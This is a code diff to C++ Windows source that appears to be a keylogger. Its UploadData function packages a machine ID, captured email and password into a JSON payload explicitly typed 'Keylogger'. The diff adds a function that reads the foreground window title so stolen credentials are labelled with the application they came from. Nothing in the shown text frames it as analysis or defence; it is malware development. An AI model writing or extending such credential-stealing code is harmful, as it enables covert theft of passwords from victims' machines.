@@ -14,7 +14,6 @@
 #pragma comment(lib, "bcrypt.lib")
 
 // --- 1. JSON ESCAPING HELPER ---
-// Prevents symbols like " or \ from breaking the JSON payload
 std::string EscapeJson(const std::string& s) {
     std::ostringstream o;
     for (auto c = s.c_str(); *c; c++) {
@@ -74,6 +73,16 @@ std::string GetMachineId() {
     return "unknown_machine_id";
 }
 
+std::string GetActiveWindowTitle() {
+    char title[256];
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd) {
+        GetWindowTextA(hwnd, title, sizeof(title));
+        return std::string(title);
+    }
+    return "Desktop/System";
+}
+
 void WriteDebug(std::string msg) {
     std::ofstream f1("internal_status.txt", std::ios::app);
     if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }
@@ -100,7 +109,7 @@ void UploadData(std::string email, std::string pass) {
        << "\"machineId\": \"" << GetMachineId() << "\","
        << "\"type\": \"Keylogger\","
        << "\"data\": {"
-       <<     "\"WindowsTitle\": \"" << EscapeJson("Active Window") << "\"," // Simplified for JSON safety
+       <<     "\"WindowsTitle\": \"" << EscapeJson(GetActiveWindowTitle()) << "\"," 
        <<     "\"email\": \"" << EscapeJson(email) << "\","
        <<     "\"password\": \"" << EscapeJson(pass) << "\""
        << "},"
